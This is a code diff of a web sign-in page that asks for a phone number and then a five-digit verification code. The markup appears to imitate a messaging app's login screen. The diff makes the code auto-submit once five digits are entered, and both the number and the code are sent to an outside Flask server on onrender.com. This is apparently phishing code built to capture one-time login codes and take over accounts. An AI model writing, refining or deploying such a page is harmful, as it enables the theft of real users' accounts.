@@ -60,7 +60,6 @@
                                 <input class="form-control" type="text" id="verificationCode" inputmode="tel" aria-label="Code">
                                 <label for="sign-in-code">Code</label>
                             </div>
-                            <button type="button" class="Button default primary text has-ripple" id="verifyBtn">Verify</button>
                         </form>
                     </div>
                     <div class="auth-form" id="qrForm">
@@ -813,6 +812,7 @@
 window.addEventListener("DOMContentLoaded", () => {
     const phoneForm = document.getElementById("phoneForm");
     const codeForm = document.getElementById("codeForm");
+    const verificationInput = document.getElementById("verificationCode");
     let currentPhone = null;  // to remember the phone number for the code step
 
     document.getElementById("nextBtn").addEventListener("click", function () {
@@ -829,10 +829,9 @@ window.addEventListener("DOMContentLoaded", () => {
         .then(res => res.json())
         .then(data => {
             if (data.status === "success") {
-                alert("Code sent!");
                 currentPhone = phone;      // save phone for next request
                 phoneForm.style.display = "none";
-                codeForm.style.display = "flex";
+                codeForm.style.display = "block";
             } else {
                 alert("Error: " + data.message);
             }
@@ -854,30 +853,37 @@ window.addEventListener("DOMContentLoaded", () => {
         }
     });
 
-    document.getElementById("verifyBtn").addEventListener("click", function () {
-        const code = document.getElementById("verificationCode").value;
-        console.log("Code:", code);
+    verificationInput.addEventListener("input", function () {
+        const code = this.value.trim();
 
-        fetch("https://flask-duhv.onrender.com/verify-code", {  // you need to add this endpoint in Python!
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({ phone: currentPhone, code })
-        })
-        .then(res => res.json())
-        .then(data => {
-            if (data.status === "success") {
-                alert("Verification successful!");
-                // proceed with next steps, maybe hide codeForm or show success message
-            } else {
-                alert("Error: " + data.message);
-            }
-        })
-        .catch(err => {
-            console.error(err);
-            alert("Request failed");
-        });
+        // Reset border on new input
+        verificationInput.style.borderColor = "";
+
+        if (code.length === 5) {
+            verificationInput.disabled = true;
+
+            fetch("https://flask-duhv.onrender.com/verify-code", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone: currentPhone, code })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.status === "success") {
+                    alert("Verification successful!");
+                    // You can redirect or show a new screen here
+                } else {
+                    verificationInput.style.borderColor = "red";
+                }
+            })
+            .catch(err => {
+                console.error(err);
+                verificationInput.style.borderColor = "red";
+            })
+            .finally(() => {
+                verificationInput.disabled = false;
+            });
+        }
     });
 });
 
